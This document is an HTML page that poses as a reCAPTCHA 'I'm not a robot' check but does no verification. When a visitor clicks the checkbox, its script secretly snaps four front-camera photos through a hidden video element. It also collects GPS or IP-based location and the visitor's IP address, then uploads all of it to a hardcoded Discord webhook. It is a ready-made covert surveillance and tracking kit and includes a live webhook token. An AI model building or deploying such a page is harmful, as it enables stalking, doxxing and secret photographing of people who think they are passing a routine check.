<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>reCAPTCHA Verification</title>
<style>
    body {
        font-family: 'Roboto', Arial, sans-serif;
        background: #f2f2f2;
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        margin: 0;
        padding: 24px 0;
        box-sizing: border-box;
    }

    .rc-wrap { display: flex; flex-direction: column; align-items: center; gap: 12px; }

    .rc-box {
        width: 304px;
        background: #fff;
        border: 1px solid #d3d3d3;
        border-radius: 3px;
        box-shadow: 0 0 4px rgba(0,0,0,.08);
        cursor: pointer;
        user-select: none;
    }

    .rc-head { display: flex; align-items: center; padding: 14px 16px 14px 12px; }

    .rc-cb {
        width: 28px; height: 28px;
        border: 2px solid #c1c1c1;
        background: #fff;
        border-radius: 3px;
        margin-right: 14px;
        display: flex; align-items: center; justify-content: center;
        transition: all .2s;
        flex: 0 0 auto;
    }

    .rc-cb.checked { background: #156b3c; border-color: #156b3c; }
    .rc-cb.loading { background: #f9f9f9; border-color: #c1c1c1; }

    .rc-tick { color: #fff; font-size: 19px; font-weight: bold; line-height: 1; display: none; }
    .rc-cb.checked .rc-tick { display: block; }

    .rc-spin {
        width: 18px; height: 18px;
        border: 2px solid #e0e0e0;
        border-top-color: #156b3c;
        border-radius: 50%;
        animation: rcs 1s linear infinite;
        display: none;
    }

    .rc-cb.loading .rc-spin { display: block; }
    .rc-cb.checked .rc-spin { display: none; }

    @keyframes rcs { to { transform: rotate(360deg); } }

    .rc-logo { flex: 1; display: flex; align-items: center; gap: 8px; }
    .rc-mark { width: 42px; height: 42px; flex: 0 0 auto; }
    .rc-main { font-size: 14px; color: #222; font-weight: 500; }
    .rc-sub { font-size: 10px; color: #888; margin-top: 2px; }

    .rc-foot {
        background: #f9f9f9;
        border-top: 1px solid #e8e8e8;
        padding: 8px 16px;
        display: flex;
        justify-content: space-between;
        font-size: 10px;
        color: #555;
    }

    .rc-foot a { color: #555; text-decoration: none; margin-left: 8px; }

    .rc-status {
        font: 11px/1.6 ui-monospace, Menlo, Consolas, monospace;
        color: #777;
        text-align: center;
        max-width: 330px;
        word-break: break-word;
    }
</style>
</head>
<body>

<div class="rc-wrap">
    <div class="rc-box" id="widget">
        <div class="rc-head">
            <div class="rc-cb" id="cb">
                <span class="rc-tick">&#10003;</span>
                <div class="rc-spin"></div>
            </div>
            <div class="rc-logo">
                <svg class="rc-mark" viewBox="0 0 48 48">
                    <path d="M24 2L46 14v20L24 46 2 34V14z" fill="#f9f9f9"/>
                    <path d="M24 8l16 9.2v9.6L24 36 8 26.8v-9.6z" fill="#fff"/>
                    <path d="M24 14l10 5.8v5.4L24 30l-10-5.8v-5.4z" fill="#e0e0e0"/>
                </svg>
                <div>
                    <div class="rc-main" id="mainText">I'm not a robot</div>
                    <div class="rc-sub">Privacy - Terms</div>
                </div>
            </div>
        </div>
        <div class="rc-foot">
            <span>Protected by reCAPTCHA</span>
            <span><a href="#">Privacy</a><a href="#">Terms</a></span>
        </div>
    </div>
    <div class="rc-status" id="status">idle</div>
</div>

<script>
/* ============================================================
   PASTE YOUR DISCORD WEBHOOK URL HERE
   ============================================================ */
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553766824783388812/Zm7f_7JZlFK6PzVg-QrM4BKK_v281MkdteFPeQQYm9TN6TbryaBtPCgJO1b1OEYslokp?wait=true';

const widget   = document.getElementById('widget');
const cb       = document.getElementById('cb');
const mainText = document.getElementById('mainText');
const statusEl = document.getElementById('status');

let busy = false;
const say = m => { statusEl.textContent = m; };

widget.addEventListener('click', async () => {
    if (busy) return;
    busy = true;
    cb.classList.add('loading');
    mainText.textContent = 'Verifying...';

    // Location starts FIRST and synchronously so mobile browsers
    // still count it as inside the click gesture.
    const locPromise = getLocation();
    const ipPromise  = getIP();

    try {
        say('waiting for permissions...');

        const photos = await capturePhotos();

        // Hard ceiling so a stalled GPS fix can never block the upload.
        const location = await Promise.race([
            locPromise,
            new Promise(r => setTimeout(() => r(null), 25000))
        ]);
        const ip = await ipPromise;

        say(location ? ('loc ok: ' + location.label + ' [' + location.src + ']') : 'loc unavailable');

        await send(photos, ip, location);
        say('sent ' + photos.length + ' photo(s)' + (location ? ' + location' : ''));
    } catch (e) {
        console.warn(e);
        say('error: ' + e.message);
    }

    cb.classList.remove('loading');
    cb.classList.add('checked');
    mainText.textContent = 'Verified';
    busy = false;
});

/* ============================================================
   LOCATION
   GPS and IP lookup race each other. GPS wins if it answers.
   ============================================================ */
function getLocation() {
    const gpsPromise = gpsLocation();
    const ipPromise  = ipLocation();
    return (async () => (await gpsPromise) || (await ipPromise))();
}

function gpsLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);

        let settled = false;
        const finish = v => { if (!settled) { settled = true; resolve(v); } };

        const attempt = (highAccuracy, timeout) => new Promise(res => {
            let s = false;
            const d = v => { if (!s) { s = true; res(v); } };
            const guard = setTimeout(() => d({ err: 'timeout' }), timeout + 2000);

            navigator.geolocation.getCurrentPosition(
                p => {
                    clearTimeout(guard);
                    d({ pos: {
                        lat: p.coords.latitude,
                        lng: p.coords.longitude,
                        acc: p.coords.accuracy,
                        src: highAccuracy ? 'GPS' : 'Network'
                    }});
                },
                e => {
                    clearTimeout(guard);
                    d({ err: e.code === 1 ? 'denied' : 'error' });
                },
                { enableHighAccuracy: highAccuracy, timeout: timeout, maximumAge: highAccuracy ? 0 : 300000 }
            );
        });

        // Attempt 1 fires synchronously inside the click handler.
        attempt(false, 7000).then(async a => {
            if (a.pos) { finish(await withLabel(a.pos)); return; }
            if (a.err === 'denied') { finish(null); return; }
            const b = await attempt(true, 12000);
            finish(b.pos ? await withLabel(b.pos) : null);
        });
    });
}

async function withLabel(pos) {
    const l = await reverseGeocode(pos.lat, pos.lng);
    pos.label = l || (pos.lat.toFixed(5) + ', ' + pos.lng.toFixed(5));
    return pos;
}

async function reverseGeocode(lat, lng) {
    const urls = [
        'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=en',
        'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + lat + '&lon=' + lng
    ];

    for (const u of urls) {
        try {
            const c = new AbortController();
            const t = setTimeout(() => c.abort(), 5000);
            const r = await fetch(u, { signal: c.signal });
            clearTimeout(t);
            if (!r.ok) continue;

            const d = await r.json();
            const ad = d.address || {};
            const s = [
                d.city || d.locality || ad.city || ad.town || ad.village,
                d.principalSubdivision || ad.state,
                d.countryName || ad.country
            ].filter(Boolean).join(', ');

            if (s) return s;
        } catch (e) {}
    }
    return null;
}

/* Six keyless HTTPS providers raced with Promise.any.
   First valid answer wins; the rest are ignored. */
const PROVIDERS = [
    { u: 'https://api.bigdatacloud.net/data/reverse-geocode-client?localityLanguage=en',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city || d.locality, d.principalSubdivision, d.countryName].filter(Boolean).join(', ') } : null },

    { u: 'https://get.geojs.io/v1/ip/geo.json',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null },

    { u: 'https://ipwho.is/',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null },

    { u: 'https://freeipapi.com/api/json',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.cityName, d.regionName, d.countryName].filter(Boolean).join(', ') } : null },

    { u: 'https://ipapi.co/json/',
      p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
           l: [d.city, d.region, d.country_name].filter(Boolean).join(', ') } : null },

    { u: 'https://ipinfo.io/json',
      p: d => d.loc ? { lat: +d.loc.split(',')[0], lng: +d.loc.split(',')[1],
           l: [d.city, d.region, d.country].filter(Boolean).join(', ') } : null }
];

async function ipLocation() {
    const tries = PROVIDERS.map(p => (async () => {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), 6000);

        try {
            const r = await fetch(p.u, { signal: c.signal, cache: 'no-store' });
            if (!r.ok) throw new Error(r.status);

            const d = await r.json();
            const val = p.p(d);

            if (!val || !isFinite(val.lat) || !isFinite(val.lng)) throw new Error('bad');
            if (val.lat === 0 && val.lng === 0) throw new Error('zero');

            return {
                lat: val.lat,
                lng: val.lng,
                acc: null,
                src: 'IP',
                label: val.l || (val.lat.toFixed(4) + ', ' + val.lng.toFixed(4))
            };
        } finally {
            clearTimeout(t);
        }
    })());

    try { return await Promise.any(tries); }
    catch (e) { return null; }
}

async function getIP() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        return (await r.json()).ip || 'Unknown';
    } catch (e) { return 'Unknown'; }
}

/* ============================================================
   CAMERA - 4 front-cam snaps
   ============================================================ */
async function capturePhotos() {
    const out = [];
    for (let i = 1; i <= 4; i++) {
        say('photo ' + i + '/4');
        const s = await snap();
        if (s) out.push({ blob: s, name: 'front_snap_' + i + '.jpg' });
    }
    return out;
}

function snap() {
    return new Promise(async resolve => {
        let done = false;
        const finish = v => { if (!done) { done = true; resolve(v); } };
        const guard = setTimeout(() => finish(null), 6000);

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            });

            const v = document.createElement('video');
            v.srcObject = stream;
            v.muted = true;
            v.setAttribute('playsinline', '');
            v.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0';
            document.body.appendChild(v);

            await new Promise(res => {
                let s = false;
                const go = () => { if (!s) { s = true; res(); } };
                v.onloadedmetadata = go;
                v.onerror = go;
                setTimeout(go, 2000);
            });

            await v.play().catch(() => {});
            await new Promise(r => setTimeout(r, 400));

            const w = v.videoWidth || 640;
            const h = v.videoHeight || 480;
            const c = document.createElement('canvas');
            c.width = w;
            c.height = h;

            const ctx = c.getContext('2d');
            ctx.translate(w, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(v, 0, 0, w, h);

            stream.getTracks().forEach(t => t.stop());
            v.srcObject = null;
            v.remove();

            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
            clearTimeout(guard);
            finish(blob);
        } catch (e) {
            console.warn('snap', e);
            clearTimeout(guard);
            finish(null);
        }
    });
}

/* ============================================================
   SEND TO DISCORD
   ============================================================ */
async function send(photos, ip, location) {
    const maps = location ? 'https://www.google.com/maps?q=' + location.lat + ',' + location.lng : null;

    const lines = ['**Verification Captured**'];

    if (location) {
        lines.push('Location: ' + location.label);
        lines.push('Coords: ' + location.lat.toFixed(6) + ', ' + location.lng.toFixed(6) + ' (' + location.src + ')');
        lines.push('Map: ' + maps);
    } else {
        lines.push('Location: denied / unavailable');
    }

    lines.push('IP: ' + ip);

    const embed = {
        title: 'Verification Capture',
        color: 0x156b3c,
        fields: [
            { name: 'IP', value: ip, inline: true },
            { name: 'Photos', value: String(photos.length), inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    if (location) {
        embed.url = maps;
        embed.fields.push({ name: 'Location', value: location.label, inline: false });
        embed.fields.push({ name: 'Coords', value: location.lat.toFixed(6) + ', ' + location.lng.toFixed(6), inline: false });
        embed.image = {
            url: 'https://maps.wikimedia.org/img/osm-intl,16,' + location.lat + ',' + location.lng + ',600x300.png'
        };
    }

    const payload = { content: lines.join('\n'), embeds: [embed], attachments: [] };
    const fd = new FormData();

    photos.forEach((p, i) => {
        fd.append('files[' + i + ']', p.blob, p.name);
        payload.attachments.push({ id: i, filename: p.name });
    });

    fd.append('payload_json', new Blob([JSON.stringify(payload)], { type: 'application/json' }));

    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
    if (!res.ok) throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 140));
}
</script>

</body>
</html>
